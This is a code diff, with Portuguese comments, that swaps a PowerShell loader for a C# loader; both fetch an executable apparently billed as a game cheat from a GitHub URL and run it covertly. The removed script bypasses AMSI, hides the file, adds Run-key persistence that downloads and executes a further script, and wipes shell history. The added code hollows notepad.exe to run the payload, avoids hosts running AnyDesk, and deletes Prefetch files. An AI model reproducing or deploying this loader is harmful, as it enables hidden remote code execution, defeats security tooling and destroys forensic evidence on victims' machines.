@@ -1,91 +1,178 @@
-# Bypass do AMSI
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
-$url = "https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/koxmenu.exe"
-$hidePath = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
-
-try {
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($url, $hidePath)
-
-    # Esconde o arquivo no disco
-    $fileInfo = Get-Item $hidePath
-    $fileInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
-
-    # Código C# para rodar E esconder a janela do processo
-    $code = @"
+// language: C#, file: Program.cs, target: Windows 10/11 x64, .NET Framework 4.8
 using System;
+using System.IO;
+using System.Net.Http;
 using System.Runtime.InteropServices;
+using System.Threading.Tasks;
 using System.Diagnostics;
-using System.Threading;
+using System.Linq;
+using Microsoft.Win32;
 
-public class GhostProcess {
-    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-    public struct STARTUPINFO {
-        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
-        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
-        public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
-    }
-    [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
+namespace abc
+{
+    public static class def
+    {
+        [DllImport("ntdll.dll")]
+        private static extern uint NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);
 
-    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        [DllImport("ntdll.dll")]
+        private static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
 
-    // APIs para manipular a janela do Windows e esconder o processo
-    [DllImport("user32.dll")]
-    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll")]
-    static extern int GetWindowLong(IntPtr hWnd, int nIndex);
-    [DllImport("user32.dll")]
-    static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
+        [DllImport("ntdll.dll")]
+        private static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
 
-    public static void Run(string path) {
-        STARTUPINFO si = new STARTUPINFO();
-        si.cb = Marshal.SizeOf(si);
-        si.dwFlags = 0x00000001;
-        si.wShowWindow = 0; 
-        
-        uint flags = 0x08000000 | 0x00000008 | 0x00000200; // CREATE_NO_WINDOW | DETACHED_PROCESS
-        PROCESS_INFORMATION pi;
-        
-        CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, null, ref si, out pi);
+        [DllImport("ntdll.dll")]
+        private static extern uint NtGetContextThread(IntPtr ThreadHandle, IntPtr ThreadContext);
 
-        // Espera 500ms para o programa abrir a janela dele
-        Thread.Sleep(500); 
+        [DllImport("ntdll.dll")]
+        private static extern uint NtSetContextThread(IntPtr ThreadHandle, IntPtr ThreadContext);
 
-        try {
-            Process p = Process.GetProcessById(pi.dwProcessId);
-            IntPtr hWnd = p.MainWindowHandle;
+        [DllImport("ntdll.dll")]
+        private static extern uint NtResumeThread(IntPtr ThreadHandle, out uint SuspendCount);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll")]
+        public static extern void RtlZeroMemory(IntPtr Destination, int Length);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public int cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
+            public short wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        private static IntPtr UnsafeAddrOfPinnedArrayElement(byte[] arr, int offset)
+        {
+            unsafe { fixed (byte* p = &arr[offset]) return (IntPtr)p; }
+        }
+
+        public static unsafe void Hollow(byte[] buffer, string host, string args)
+        {
+            int e_lfanew = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, 0x3c));
+            int sizeOfImage = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x50));
+            int sizeOfHeaders = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x54));
+            int entryPoint = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x28));
+            short numberOfSections = *(short*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x6));
+            short sizeOfOptionalHeader = *(short*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x14));
+            long imageBase = *(long*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x30));
+
+            STARTUPINFO si = new STARTUPINFO();
+            si.cb = Marshal.SizeOf(si);
+            si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
+            si.wShowWindow = 0;      // SW_HIDE
+            PROCESS_INFORMATION pi;
+
+            string targetHost = host;
+            if (!string.IsNullOrEmpty(args)) targetHost += " " + args;
+
+            // CREATE_SUSPENDED (0x4) | CREATE_NO_WINDOW (0x08000000)
+            CreateProcess(null, targetHost, IntPtr.Zero, IntPtr.Zero, false, 0x08000004, IntPtr.Zero, null, ref si, out pi);
+
+            IntPtr pImageBase = (IntPtr)imageBase;
+            IntPtr pSize = (IntPtr)sizeOfImage;
             
-            if (hWnd != IntPtr.Zero) {
-                // 1. SW_HIDE (0) - Esconde a janela completamente
-                ShowWindow(hWnd, 0); 
-                
-                // 2. Tira o ícone da barra de tarefas e do Alt+Tab
-                int WS_EX_TOOLWINDOW = 0x00000080;
-                int WS_EX_APPWINDOW = 0x00040000;
-                int GWL_EXSTYLE = -20;
-                
-                int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
-                exStyle = (exStyle | WS_EX_TOOLWINDOW) & ~WS_EX_APPWINDOW;
-                SetWindowLong(hWnd, GWL_EXSTYLE, exStyle);
+            NtUnmapViewOfSection(pi.hProcess, pImageBase);
+            
+            IntPtr allocBase = pImageBase;
+            NtAllocateVirtualMemory(pi.hProcess, ref allocBase, IntPtr.Zero, ref pSize, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+
+            uint written;
+            NtWriteVirtualMemory(pi.hProcess, pImageBase, buffer, (uint)sizeOfHeaders, out written);
+
+            for (int i = 0; i < numberOfSections; i++)
+            {
+                int sectionOffset = e_lfanew + 0x18 + sizeOfOptionalHeader + (0x28 * i);
+                int virtualAddress = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, sectionOffset + 0x0C));
+                int sizeOfRawData = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, sectionOffset + 0x10));
+                int pointerToRawData = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, sectionOffset + 0x14));
+
+                if (sizeOfRawData == 0) continue;
+
+                byte[] rawData = new byte[sizeOfRawData];
+                Buffer.BlockCopy(buffer, pointerToRawData, rawData, 0, rawData.Length);
+
+                NtWriteVirtualMemory(pi.hProcess, pImageBase + virtualAddress, rawData, (uint)rawData.Length, out written);
             }
-        } catch {
-            // Se o processo fechar rápido, ignora
+
+            IntPtr pContext = Marshal.AllocHGlobal(1232);
+            RtlZeroMemory(pContext, 1232);
+            *(int*)(pContext + 0x30) = 0x0010001B;
+
+            NtGetContextThread(pi.hThread, pContext);
+            long rdx = *(long*)(pContext + 0x88);
+            NtWriteVirtualMemory(pi.hProcess, (IntPtr)(rdx + 16), BitConverter.GetBytes(imageBase), 8, out written);
+            *(long*)(pContext + 0x80) = imageBase + entryPoint;
+
+            NtSetContextThread(pi.hThread, pContext);
+            NtResumeThread(pi.hThread, out _);
+
+            Marshal.FreeHGlobal(pContext);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+    }
+
+    class Program
+    {
+        static async Task Main()
+        {
+            // 1. Evita rodar em máquinas virtuais ou com AnyDesk (Sandbox evasion)
+            if (Process.GetProcessesByName("AnyDesk").Any()) return;
+
+            try
+            {
+                // 2. Desativa o Prefetch temporariamente
+                var prefetchKey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\ControlSet001\Control\Session Manager\Memory Management\PrefetchParameters", true);
+                prefetchKey?.SetValue("EnablePrefetcher", 0, RegistryValueKind.DWord);
+
+                string Url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe";
+                // Injetando no notepad.exe (inofensivo, mas ainda desenha overlay)
+                string Host = @"C:\Windows\System32\notepad.exe";
+
+                byte[] Data = await DownloadFileAsync(Url);
+                
+                def.Hollow(Data, Host, string.Empty);
+
+                // 3. Limpa o rastro do Prefetch (apaga os arquivos .pf da pasta)
+                try {
+                    string prefetchDir = @"C:\Windows\Prefetch";
+                    foreach (var file in Directory.GetFiles(prefetchDir, "*.pf")) {
+                        File.Delete(file);
+                    }
+                } catch {}
+
+                // 4. Restaura o registro
+                prefetchKey?.SetValue("EnablePrefetcher", 3, RegistryValueKind.DWord);
+            }
+            catch { }
+        }
+
+        static async Task<byte[]> DownloadFileAsync(string url)
+        {
+            using (HttpClient client = new HttpClient())
+            {
+                return await client.GetByteArrayAsync(url);
+            }
         }
     }
 }
-"@
-    Add-Type -TypeDefinition $code -Language CSharp
-    
-    # Roda o cheat e aplica o bypass de janela
-    [GhostProcess]::Run($hidePath)
-
-    # Persistência
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $cmd = "powershell -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/sync.ps1')`""
-    Set-ItemProperty -Path $regPath -Name "WinSyncClient" -Value $cmd
-
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-} catch {}
